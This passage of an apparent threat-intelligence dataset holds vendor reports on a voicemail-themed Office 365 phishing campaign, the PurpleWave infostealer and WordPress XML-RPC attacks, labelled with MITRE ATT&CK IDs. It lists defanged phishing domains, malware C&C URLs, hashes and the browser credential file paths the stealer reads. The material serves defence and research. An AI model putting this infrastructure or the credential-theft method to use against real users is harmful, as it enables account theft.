phishing page for evasion*\nUsers will be redirected to the main credential-phishing page after solving\u00a0the captcha.\nThe final phishing page spoofs the Microsoft Office 365 login page, as shown in Figures 11\u00a0and 12.\n![Picture 10](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/voicemail_phishing/Picture%2010.png)\n*Figure 11: Credential-phishing landing page to steal Office 365 credentials*\n*![Picture 11](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/voicemail_phishing/Picture%2011.png)*\n*Figure 12: Office 365 phishing page*\n**XYZ top-level domain abuse**\n------------------------------\nBelow is a list of domains we identified that were registered between June and mid-July 2020 and were used by the threat actor(s) for conducting credential-phishing campaigns using the voicemail theme.\nnovoips[.]xyz\nvoced-mxd[.]xyz\nvoicenotes-sms[.]xyz\nnewvmwav-voi[.]xyz\nxvxvoip[.]xyz\nvmpla-yvmc[.]xyz\nvoip-sms[.]xyz\nvoipmails-srv[.]xyz\nvoipsms-ss[.]xyz\nvoicemail-srv[.]xyz\nvoicemail-sms[.]xyz\nThese domains share some similarities in their naming convention:\n* All the domains were using the top-level domain (TLD) of XYZ\n* The domain names contained keywords such as \u201cvoip,\u201d\u00a0\u201cvoicemail,\u201d\u00a0and \u201csms\u201d for social engineering purposes\n* Most of these domains were registered with the German-based hosting service: \u201c1und1\u201d\n* The URL pattern used for credential phishing is: hxxp://domain\\_name.xyz/?e=<email\\_address>\n* The parameter e in the URL corresponds to the recipient's email address\n* If the URL is accessed directly without the email address in the URL as a parameter, the user will be redirected to the office.com site\nWe can see that the attackers took several measures to ensure that automated URL analysis cannot be performed and the URLs look convincing to the end user.\nOther TLDs that were abused by the threat actor in this campaign are: .club and .online.\nThe complete list of domains used in this variant of the campaign are mentioned in the Indicators of Compromise (IOCs) section at the end of this\u00a0blog.\n**Cisco Unity Connection spoofed theme**\n----------------------------------------\nOn July 6, 2020, we observed in the Zscaler\u00a0cloud several connection attempts to the domain: *secure.ciscovoicemail.cf* which is a site created by the threat actor to spoof Cisco\u2019s Unity Connection voicemail portal, as shown in Figure 13.\n![Picture 12](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/voicemail_phishing/Picture%2012.png)\n*Figure 13: Web page spoofing Cisco Unity Connection \u2013\u00a0voicemail portal*\nAn icon of an audio file is displayed to the user.\nOnce this icon is clicked, the user is redirected to the credential-phishing landing page, which is designed to target multiple brands, as shown in Figure 14.\n![Picture 13](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/voicemail_phishing/Picture%2013.png)\n*Figure 14: Landing page targeting multiple brands*\nBelow is the list of brands targeted by this campaign.\n* Office 365\n* Mimecast\n* Outlook Web Access (OWA)\n* Gmail\n* Yahoo\n* Others (generic)\nOnce the user clicks on any of the above links, a corresponding phishing page is displayed.\nAs an example, the OWA phishing page is displayed (Figure 15) when the user clicks the \u201cOutlook Web Access\u201d link on the web page.\n![Picture 14](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/voicemail_phishing/Picture%2014.png)\n*Figure 15: OWA phishing page*\n**Zscaler\u2019s detection status**\n------------------------------\nZscaler\u2019s multilayered cloud security platform detects indicators at various levels, as seen here:\n[HTML.Phish.Microsoft](https://threatlibrary.zscaler.com/?keyword=HTML.Phish.Microsoft)\n[HTML.Phish.Office365](https://threatlibrary.zscaler.com/?keyword=HTML.Phish.Office365)\n**Conclusion**\n--------------\nThis threat actor leverages well-crafted social engineering techniques and combines them with evasion tactics designed to bypass automated URL analysis solutions to achieve better success in reaching users and stealing their credentials.\nAs an extra precaution, users should not open attachments in emails\u00a0sent from untrusted or unknown sources.\nAs a best practice, in general, users should verify the URL in the address bar of the browser before entering any credentials.\nThe Zscaler ThreatLabZ team will continue to monitor this campaign, as well as others, to help keep our customers safe.\n**Indicators of Compromise (IOCs)**\n-----------------------------------\n### **Domains using voicemail and VoIP themes**\nauthtication[.]voicereport[.]club\ncallervm[.]on-smsvoice[.]xyz\ncs[.]tu-mbla[.]xyz\nkb[.]mousecable[.]club\nmsgvoip[.]voip2[.]xyz\nnosms[.]voicemail-srv[.]xyz\nnovoip[.]smvm[.]xyz\nowabusiness[.]evolp-voicemessage[.]club\npreview[.]voice-mailapp[.]club\nres[.]ms-cable[.]club\nrs[.]mousecable[.]club\nserv[.]dedicat-servvmd[.]xyz\nserv[.]micserv-llc[.]xyz\nserv[.]voip-servernet[.]xyz\nserver[.]pressvp-net[.]xyz\nserver[.]voi-cememnet[.]xyz\nservingnet[.]voipmails-srv[.]xyz\nservnet[.]dedicat-servvmd[.]xyz\nservnet[.]micserv-llc[.]xyz\nservnet[.]newvmwav-voi[.]xyz\nservnet[.]pressvp-net[.]xyz\nservnet[.]voi-cememnet[.]xyz\nservnet[.]voip-servernet[.]com\nservnet[.]voip-servernet[.]xyz\nservnet[.]voip-serversoftonline[.]xyz\nservxds[.]voipmsx-serv[.]xyz\nsplit[.]spiral-servsnet[.]xyz\nsrvnet[.]voip-servernet[.]com\nvm[.]vc-blacks-see[.]club\nvmails[.]voicemail-srv[.]xyz\nvmcaller[.]xvxvoip[.]xyz\nvn[.]pr-nijim[.]xyz\nvoicemails[.]voicemail-sms[.]xyz\nvoicemessage[.]p2pvolp-connection[.]club\nvoicenote[.]on-smsvoice[.]xyz\nvoicenote[.]voip-sms[.]xyz\nvoicenots[.]xvxvoip[.]xyz\nvoip-server[.]voced-mxd[.]xyz\nvoip[.]svpx[.]xyz\nvoipmsg[.]vmr232[.]xyz\nvpxrsd[.]voic-e-mx[.]xyz\nwebsrv[.]sercu-voipvm[.]online\n**Externally hosted JavaScripts used to load the phishing content**\nsunrare[.]com/o/50e86e68f0f3c0f8fefb78cae4070fab/assets/js/eb0c32d32967828335971031a7f69473[.]js\nbirdeiye[.]com/tlc/1fb28f1a6214fadb63727b59f6c47b48/assets/js/9b40ffe428c251fa9290c96cebe7ec22[.]js\nbirdeiye[.]com/tlc/f14277d7aeb98e7d97598d37d9c9b0b6/assets/js/a7ea834d6055724f803fb685792a53ba[.]js\nselagikamana[.]com/zqp/572a5796b6771661fd5c14e5eb030fa4/assets/js/fb011c8479de271fa425cb3c0090354a[.]js\nwww[.]sunrare[.]com/o/61f414c3c63cd9cdddb5c074ead6bf42/assets/js/aef79e7c7ea0af42bc3f2bbda0389025[.]js\ndonzipelt[.]com/def/4dd0b3fe161066f007fc67e1f7e2b1f0/assets/js/9d9e5f30ac5d845e86ef027d5048d578[.]js\ndonzipelt[.]com/def/5dc46609ba95bde0af73bf1503a37ccb/assets/js/3dd94d0fa362965267e407d9da2f0d50[.]js\nwww[.]sunrare[.]com/o/d1990b1a24c0e238566a817a620d1730/assets/js/05f957ca65d7884c707ff9ceb0ed35d0[.]js\njessicabenaridesigns[.]com/poc/0991088e015559e0f28a5b8c1ceaec99/assets/js/9d66beb85e9baf57b3d5613327f18532[.]js\nduduknax[.]com/tol/414de52007f92181334cff78781dbcf8/assets/js/d23a1f5183fbd7361f25331bffbe0080[.]js\nsunrare[.]com/o/e9fe886b01d023891df84892932fe818/assets/js/70fd63b8279390b9e497bc7bb5e8ebf9[.]js\npocopassdfgnow[.]website/d9304846708577b8218634513d040c7d/assets/js/f65b3324ecb14d0f8519d74fb71d69ed[.]js\nwww[.]sunrare[.]com/o/962ffb6ffd63e7f264d7647ae43bd0d2/assets/js/f0de7b83ce53ac9ad95f159c83238fc8[.]js\nwww[.]sunrare[.]com/o/a1c3fd81c71ea04ca54a0849ed87f71a/assets/js/8f2ee1290175a2c989609540b51966ed[.]js\nzetcontechnologies[.]com/app/7879f9ee764455df97e00f7e29e57ed6/assets/js/3a4ae029e8613b15ee9636d3069eefac[.]js\nzetcontechnologies[.]com/app/3c6be750a9d9afea5b5d045b69a0ecdc/assets/js/d4f97f5c855bc87fb716531c15b41982[.]js\nduduknax[.]com/tol/a01a19c1f9c346b46e67c10b62ee929f/assets/js/bfc47b5a191c01ebedb48d6687736093[.]js\nduduknax[.]com/tol/3c0d8af5aa88acfe9f4785b183bc0b0f/assets/js/8d56426a10faecebed92e7ad44f9a37e[.]js\nduduknax[.]com/tol/6a75a934186109a9da52d1a277bd5225/assets/js/5ce9e997caf186f4d487f68dc2dbbcf6[.]js\nlompintsc[.]com/del/0cbd7a8540753de4d507786645a5066b/assets/js/67a61205f2dcbfa7635a394295bc5666[.]js\nlompintsc[.]com/del/da40d7bebec2d1368a18990bb519a410/assets/js/fb6637c96873022b36531ddf2a4efd01[.]js\nlompintsc[.]com/del/63da6c6c93262b3d47bb128f05164db8/assets/js/b36705e19d470036493436da163570a9[.]js\nlompintsc[.]com/del/7712b26261d18e81c851bc02e281e9ef/assets/js/985931acc11fbf06a720dbf089b3856f[.]js\nlompintsc[.]com/del/4746f26dddc4ffcea1c1b517f23fe3ab/assets/js/9e02714fc2166ff8ffdc683c00134039[.]js\nreallaunchers[.]co[.]in/me/d0b18ce7a90d9a329dc45ea25b364839/assets/js/8cb0c9c283c4300724b1b3efb265834e[.]js\nreallaunchers[.]co[.]in/me/90e1cf6dfa12605f92c9c81a2feb2a3e/assets/js/02a810708e34dc9992da0f296981c5c6[.]js\nreallaunchers[.]co[.]in/me/1287eec8c39a8fbf29d8f22f1b05951f/assets/js/6e206308e8ff21f65dd4683151955def[.]js\nreallaunchers[.]co[.]in/me/28cdb51800f6ac197371e04799f9b2f8/assets/js/60ed882d1941f778d8c21dca759eb815[.]js\nlonkamps[.]com/3632d3a40e5fa966afa789e58a89517d/assets/js/8e2decef1d03d9908180d2bce761f9a6[.]js\nplazipovc[.]com/8651f7f29d9da5768e4a121e4cf6e0e8/assets/js/a3fff382761006906580234b739ab40e[.]js\ncharlesbat[.]com/15a2b4810e0e6d4b09657616a58127e3/assets/js/56faf1d8d82e1a5bf1f948fe8cdab282[.]js\nlonkamps[.]com/8d10bdc6213ad9495fccecfc3916d754/assets/js/116542ef8641ab1787d260fdc497ce86[.]js\nlonkamps[.]com/91fb4c8ad24e428138d41739bd43d7d2/assets/js/3a9d761a4e957acb3c5d2b49fdddb027[.]js\nlonkamps[.]com/6eacd882af394260d82176b1b2da41df/assets/js/5c4e608d5857fab525ced80b98d8f2e1[.]js\ncharlesbat[.]com/9cc926e58ca86d5871814fa3cfe6f822/assets/js/2d43a2cb2d1287e9d8406519f008e597[.]js\nlonkamps[.]com/6aea44e686ffeae7d8afaeaee98e51b0/assets/js/f392a8ed26a59b5423a904f1450eaea3[.]js\nlonkamps[.]com/2ff478f17372963b19f0d9561b520e6d/assets/js/bc55dd90e976e60e4948472839d028e8[.]js\nlonkamps[.]com/5f2b041f3e93018e4061864d9245470d/assets/js/5237ec7cc3430a2e768fa25594e2ff95[.]js\nlonkamps[.]com/2d1d238ba6c5fb08801b07f82e8649bd/assets/js/c890b9085890f08953dfcd9585dcc834[.]js\nlonkamps[.]com/3bf30618619351b695669f462c1a16c7/assets/js/42a4033acc09ef391e3a25631158e490[.]js\nnorthdallashometheater[.]com/[.]xmlrpc/c3a5d87a700619ab4a5582bf5cf60f35/assets/js/255188349058257aca886ff198957324[.]js", "mitre_ids": ["T1566", "TA0006", "T1566", "T1583", "TA0006", "T1557", "T1566", "TA0006", "TA0009", "T1566", "T1059", "T1566", "T1566", "T1566", "T1566", "T1566", "T1566", "T1059", "T1566", "T1059", "T1140", "T1059", "TA0006", "T1140", "T1140", "T1059", "T1566", "T1059", "T1566", "T1566", "T1059", "T1566", "T1566", "T1059", "T1059", "T1566", "T1566", "T1566", "TA0005", "T1059", "TA0010", "T1059", "T1059", "TA0010", "TA0010", "T1566", "TA0010", "TA0005", "T1566", "T1566", "T1566", "T1566", "T1566", "T1566", "TA0005", "T1566", "T1566", "T1566", "T1566", "TA0006", "T1566"], "anno_name_label": [], "cti_entity_class": ["CE", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CE", "CE", "CI", "CE", "CI", "CI", "CE", "CI", "CI", "CE", "CE", "CI", "CI", "CI", "CI", "CE", "CI", "CE", "CE", "CI", "CI", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI"]}, {"cti_report": "PurpleWave\u2014A New Infostealer from Russia\nAugust 14, 2020\nInfostealer is one of the most profitable tools for cybercriminals, as information gathered from systems infected with this malware could be sold in the cybercrime underground or used for credential stuffing attacks.\nThe Zscaler ThreatLabZ team came across a new Infostealer called PurpleWave, which is written in C++\u00a0and silently installs itself onto a user\u2019s system.\nIt connects to a command and control (C&C) server to send system information and installs new malware onto the infected system.\nThe author of this malware is advertising and selling PurpleWave stealer\u00a0on Russian cybercrime forums for 5,000 RUB (US$68) with lifetime updates and 4,000 RUB (US$54) with only two updates.\n![PurpleWave selling post on the Russian forum](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/purplewave/purple_website.JPG)\n*Figure 1: A PurpleWave selling post on a Russian forum.*\nThe author selling PurpleWave claims that this stealer is capable of stealing passwords, cookies, cards, and autofill forms of Chromium\u00a0and Mozilla browsers.\nThis stealer also collects files from the specified path, takes screenshots, and installs additional modules.\nThe capabilities of the PurpleWave stealer include:\n* Stealing\u00a0passwords, cookies, cards, autofill(s) data, browser history from Chromium and Mozilla.\n* Collecting\u00a0files from the specified path\n* Capturing the\u00a0screen\n* Stealing\u00a0system information\n* Stealing\u00a0Telegram session files\n* Stealing\u00a0Steam application data\n* Stealing\u00a0Electrum wallet data\n* Loading\u00a0and executing\u00a0additional module/malware\n![PurpleWave Login Panel](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/purplewave/purple_panel.PNG)\n*Figure 2: The PurpleWave login panel.*\nThe author also built a dashboard where the attacker can keep an eye on the infection counts according to dates, access the stolen logs of infected machines, and change the malware configuration settings.\n![PurpleWave Infection dashboard](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/purplewave/purple_panel1.jpg)\n*Figure 3: The PurpleWave infection dashboard.*\nThe dashboard also provides the attacker with the ability to customize the configuration of the PurpleWave stealer.\n![Dashboard for customizing PurpleWave configuration](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/purplewave/purple_panel3.jpg)\n*Figure 4: The dashboard for customizing the PurpleWave configuration.*\n**Technical analysis**\nUpon execution of the PurpleWave binary, it gives a fake error message in the Russian language that can be customized by the attacker in their panel.\nBut in the background, it performs all of its malicious activities.\n![Fake error message (translated:Memory control blocks damaged)](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/purplewave/purple_fakeerror.PNG)\n*Figure 5: The fake error message in Russian.\n(It translates to: Memory control blocks damaged.)*\nThe name of the stealer (PurpleWave) and the version (1.0) are hardcoded and encrypted in the binary.\nMost of the strings in the binary are encrypted, but they get\u00a0decrypted on runtime with the help of the decryption loop present in the binary (shown in Figure 6).\n![Common Decryption function for encrypted strings in binary](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/purplewave/purple_decryptionloop.PNG)\n*Figure 6: The common decryption function for the encrypted strings in the binary.*\nThe PurpleWave binary creates a mutex with the name \u201cMutexCantRepeatThis\u201d to avoid multiple executions of malware instances.\nAfter that, it sends the HTTP POST request with the custom header and body to the C&C URL to get the configuration data.\n![Sending request to get the config data](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/purplewave/purple_configolly.PNG)\n*Figure 7:\u00a0Sending request to the C&C server to get the config data.*\nIt creates an HTTP request header with content type as \u201cform-data\u201d.\nThe boundary is assigned with \u201cboundaryaswell\u201d to act as a marker and user agent is set with \u201capp\u201d.\nIt creates a request body with a form name as \u201cid\u201d and the value assigned to it is 1.\n![Request with custom header and body to get the configuration](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/purplewave/wireshark_config.JPG)\n*Figure 8: The configuration request with the custom header and body.*\nThe received data contains the customized configuration, which may change per the binary.\nWe have observed three different configurations and different hosts of the PurpleWave binaries.\n![Configuration from different PurpleWave binaries](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/purplewave/config_comapre.png)\n*Figure 9: The configuration from different PurpleWave binaries.*\ndirs - It consists of directory information from which files to be collected.\nfake - It has the fake alert message to be shown to the user on execution.\nloaders - It consists of an additional module name to be installed on the infected system.\nFor Config-2, PurpleWave will traverse path \u201c%userprofile%/Desktop\u201d and collect the files having extensions txt, doc and docx.\nIn Config-3, it will not collect any files but it has a module named \u201cKv2TDW4O\u201d in the loaders, which will get downloaded and executed on the system.\n**Installing additional modules**\nFor installing additional modules mentioned in the received configuration (Config-3), PurpleWave\u00a0again creates an HTTP POST request with the same headers mentioned in the previous request to the C&C host followed by \u201c/loader/module\\_name\u201d.\n![Request to download additional module](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/purplewave/wireshark_loader.JPG)\n*Figure 10: The request to download an additional module.*\nPurpleWave enumerates the loaders list from a JSON configuration, downloads the module name from the C&C server and stores it in %appdata% directory, then executes it.\n![Downloading and executing additional modules](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/purplewave/purple_loader.PNG)\n*Figure 11:\u00a0Downloading and executing additional modules.*\nThe downloaded module that we observed in some PurpleWave binary is the Electrum wallet stealer, which is written in .NET\u00a0and capable of stealing Electrum wallet data from the infected system.\n![Collecting Electrum wallet data](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/purplewave/walletstealer.PNG)\n*Figure 12:\u00a0Collecting Electrum wallet data.*\n**Data stealing**\nPurpleWave\u00a0is capable of stealing credentials, autofills data, card data, cookies, and browser history from Chromium and Mozilla.\nFor Chromium browsers, it fetches the login credentials from \u201c\\%AppData%\\Local\\{Browser}\\User Data\\Default\\Login Data\u201d, cookies from \u201c\\%AppData%\\Local\\{Browser}\\User Data\\Default\\Cookies\u201d,\u00a0and other information, such as autofills data, card data, and browser history, from \u201c\\%AppData%\\Local\\{Browser}\\User Data\\Default\\Web Data\u201d.\n![Stealing Browser\u2019s data](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/purplewave/browser_data.png)\n*Figure 13:\u00a0Stealing browser\u00a0data.*\nThe stolen browser info is collected in the form of a form-data field with the names shown below followed by their value.\nUsername - browser[BrowserName][passwords][index][login]\nPassword - browser[BrowserName][passwords][index][password]\n![Stolen Browser info](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/purplewave/browser_collected.png)\n*Figure 14:\u00a0Stolen browser information.*\nAlong with the browser\u2019s data, the stealer captures the current screen and appends it to the browser's stolen data in the form-data with the filename as \u201cscreenshot.png\u201d.\n![Captured Screenshot](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/purplewave/screenshot.JPG)\n*Figure 15: A captured screenshot.*\nAfter that, it collects all the information about infected systems, such as operating system, CPU info, GPU info, machine GUID, username, machine name, and more.\n![Collected system info](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/purplewave/about_send.png)\n*Figure 16: The\u00a0system information collected by PurpleWave.*\nThe stealer also collects the SSFN files from the Steam application.\nThe Steam application is used for playing, discussing, and creating games.\nThe SSFN file exists to verify the users each time they login to their Steam account.\nIt fetches the Steam path from the registry \u201cSoftware\\\\Valve\\\\Steam\u201d and reads all the SSFN files stored into the config directory.\nPurpleWave also steals session-related files from the Telegram application.\nIt reads the value of the default key in the system registry branch \u201cHKCU\\Software\\Classes\\tdesktop.tg\\DefaultIcon\u201d\u00a0to obtain a path of Telegram and collects all the files starts with \u201cmap\u201d in the \u201cD877F783D5D3EF8C\u201d directory.\n![Collecting Steam data and Telegram data](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/purplewave/steam_telegram.png)\n*Figure 17:\u00a0Collecting Steam and Telegram data.*\nPurpleWave merges all the collected\u00a0file\u00a0data, browser data, screenshots, Steam data, Telegram data, and system info, then sends it to a C&C server using an HTTP POST request.\n![Sending stolen data to C&C server](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/purplewave/gate_post.JPG)\n*Figure 18:\u00a0Sending stolen data to C&C server*\n**Coverage**\nThe observed indicators in this attack were successfully blocked by the Zscaler Cloud Sandbox.\n![The Zscaler Cloud Sandbox report for the PurpleWave Stealer](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/purplewave/sandbox1.JPG)\n*Figure 19:\u00a0The Zscaler Cloud Sandbox report for PurpleWave.*\nIn addition to sandbox detections, Zscaler\u2019s multilayered cloud security platform detects indicators at various levels.\nThe following advanced threat protection signatures have been released for detecting the malware:\n[Win32.PWS.PurpleWave](https://threatlibrary.zscaler.com/?keyword=Win32.PWS.PurpleWave)\n**Conclusion**\nZscaler believes that PurpleWave represents an active and ongoing threat, as the\u00a0C&C\u00a0servers are still alive and responding as of this writing.\nThe malware also still appears to be available for purchase on the black market.\nPurpleWave has incredible potential to steal sensitive information.\nThe malware is in the early stages of development, with the author likely to enhance its stealing capabilities and add more features.\nWe will continue to keep track of this threat\u00a0to ensure coverage.\n[**MITRE ATT&CK**](https://attack.mitre.org/)**\u2122 tactic and technique mapping**\n**Tactic**\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0**Technique**\nT1083\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0File and directory discovery\nT1082\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0System information discovery\nT1033\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0System user discovery\nT1124\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0System time discovery\nT1016\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0System network configuration discovery\nT1020\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0Automated exfiltration\nT1041\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0Exfiltration over C&C channel\nT1071\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0Uses web protocols\nT1105\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0Downloads additional files\nT1555\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0Credentials from web browsers\nT1539\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0Steal web session cookies\nT1005\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0Data from local system\nT1113\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0Screen capture\n**Indicators of Compromise (IOCs)**\n**Hashes**\nB18BCB300AE480B16A0E0B9110E1C06C\nD8A36DCE73E91780B52B6F387C5CFD78\n9E4D3F4439ED39C01F3346FBDB7488AE\n657C3DDAFF433067C7F74F3453C7EB37\nE770544551F94296B9A867E42435206F\nE23DED17CDF532790F708E8A550969EB\nBC693652D5F57E792551C3A62049BA0B\nB5FB35BE12C66F16F55AF2C2ABC77E55\nAD24A6614C528DE81283FE4A618682C7\nAC17A56355914E231B2AD52E45D6F779\n7A728F42940F5BCB50AC9A5C57C1D361\n53BC8E68A9028C58941B78E4AD867B83\n394298EED78D455416E1E4CF0DEB4802\n30898909FD4BF93FE23C62E6962BED11\n02350FFA6B82CD2079797ED4BA1DD240\n0212EB9562992DA05AB28EFFB9D64D8A\n01C8D886BD213F983D0FD5AD35D78A9A\n**URLs**\nsh1213709[.]a[.]had[.]su/config\nsh1213709[.]a[.]had[.]su/gate\nsh1213709[.]a[.]had[.]su/loader/Kv2TDW4O\nsh1213709[.]a[.]had[.]su/loader/9ZNzBRpT\nsh1213709[.]a[.]had[.]su/loader/Ds5UabYT\nsh1213709[.]a[.]had[.]su/loader/MTIQK8lV\nmanget6z[.]beget[.]tech/config\nmanget6z[.]beget[.]tech/gate\nec2-3-134-252-78[.]us-east-2[.]compute[.]amazonaws[.]com/config\nec2-3-134-252-78[.]us-east-2[.]compute[.]amazonaws[.]com/gate\nbibaiboba[.]beget[.]tech/config\nbibaiboba[.]beget[.]tech/gate\nsumakokl[.]beget[.]tech/config\nsumakokl[.]beget[.]tech/gate\nikaschyn[.]beget[.]tech/config\nikaschyn[.]beget[.]tech/gate\nh98801x4[.]beget[.]tech/config\nh98801x4[.]beget[.]tech/gate", "mitre_ids": ["T1078", "TA0011", "TA0011", "T1041", "T1105", "T1555", "T1005", "T1113", "T1105", "T1217", "T1005", "T1113", "T1082", "T1005", "T1005", "T1005", "T1105", "TA0002", "TA0005", "T1027", "T1140", "T1140", "TA0011", "T1071", "TA0011", "T1105", "T1071", "T1071", "T1071", "T1083", "T1005", "T1005", "T1105", "TA0011", "T1071", "T1105", "TA0011", "TA0002", "T1105", "TA0002", "T1105", "T1005", "T1059", "T1005", "T1005", "TA0006", "T1217", "T1555", "T1606", "T1555", "T1217", "T1217", "T1217", "T1555", "T1113", "T1555", "T1555", "T1033", "T1082", "T1005", "T1005", "T1528", "T1528", "T1005", "TA0011", "T1041", "TA0011", "TA0011", "T1041", "TA0011", "T1083", "T1082", "T1033", "T1124", "T1016", "T1020", "T1041", "TA0011", "T1071", "T1105", "T1555", "T1539", "T1005", "T1113"], "anno_name_label": [["MALWARE", "PurpleWave"], ["MALWARE", "PurpleWave"], ["MALWARE", "PurpleWave"], ["MALWARE", "PurpleWave"], ["MALWARE", "PurpleWave"], ["MALWARE", "PurpleWave"], ["MALWARE", "Electrum"], ["MALWARE", "PurpleWave"], ["MALWARE", "PurpleWave"], ["MALWARE", "PurpleWave"], ["MALWARE", "PurpleWave"], ["MALWARE", "PurpleWave"], ["MALWARE", "PurpleWave"], ["MALWARE", "PurpleWave"], ["MALWARE", "PurpleWave"], ["MALWARE", "PurpleWave"], ["MALWARE", "PurpleWave"], ["MALWARE", "PurpleWave"], ["MALWARE", "PurpleWave"], ["MALWARE", "PurpleWave"], ["MALWARE", "PurpleWave"], ["MALWARE", "PurpleWave"], ["MALWARE", "PurpleWave"], ["MALWARE", "PurpleWave"], ["MALWARE", "Electrum"], ["MALWARE", "Electrum"], ["MALWARE", "Electrum"], ["MALWARE", "Electrum"], ["MALWARE", "PurpleWave"], ["MALWARE", "PurpleWave"], ["MALWARE", "PurpleWave"], ["MALWARE", "PurpleWave"], ["MALWARE", "PurpleWave"], ["MALWARE", "PurpleWave"], ["MALWARE", "PurpleWave"], ["MALWARE", "PurpleWave"]], "cti_entity_class": ["CI", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CE", "CE", "CE", "CI", "CI", "CE", "CI", "CI", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CI", "CI", "CI", "CE", "CE", "CI", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "Malware Leveraging XML-RPC Vulnerability to Exploit WordPress Sites\nSeptember 16, 2020\nWe have written a number of blogs about [vulnerabilities within](/blogs/research/cybercriminals-targeting-multiple-vulnerabilities-wordpress-plugins) and [attacks on](/blogs/research/compromised-wordpress-sites-used-distribute-adwind-rat) sites built with WordPress.\nAnd, when you consider that [34 percent of all websites](https://hostingtribunal.com/blog/wordpress-statistics/) in the world are built with WordPress, it\u2019s understandable that cybercriminals will continue to focus their attention on this popular platform.\nOne of the most common attack vectors employed by these bad actors is to launch an XML-RPC attack.\nXML-RPC on WordPress, which is enabled by default, is actually an API that provides third-party applications and services the ability to interact with WordPress sites, rather than through a browser.\nAttackers use this channel to establish a remote connection to a WordPress site and make modifications without being directly logged in to your WordPress system.\nHowever, if a WordPress site didn\u2019t disable XML-RPC, there is no limit to the number of login attempts that can be made by a hacker, meaning it is just a matter of time before a cybercriminal\u00a0can gain access.\nRecently, the Zscaler ThreatLabZ team came across a scheme to attack WordPress sites where a malicious program gets a list of WordPress sites from a C&C server which then are attacked leveraging the XML-RPC pingback method to fingerprint the existing vulnerabilities on the listed WordPress sites.\nEven though we saw a payload used in this attack in our Zscaler cloud and also found a campaign of similar files on [VirusTotal](https://www.virustotal.com/graph/g4f708a8a274f4ef1a8727d0c6e00d5a5f5d879652067434797084e53f5d37bef), we haven\u2019t found any specific spam templates used for this 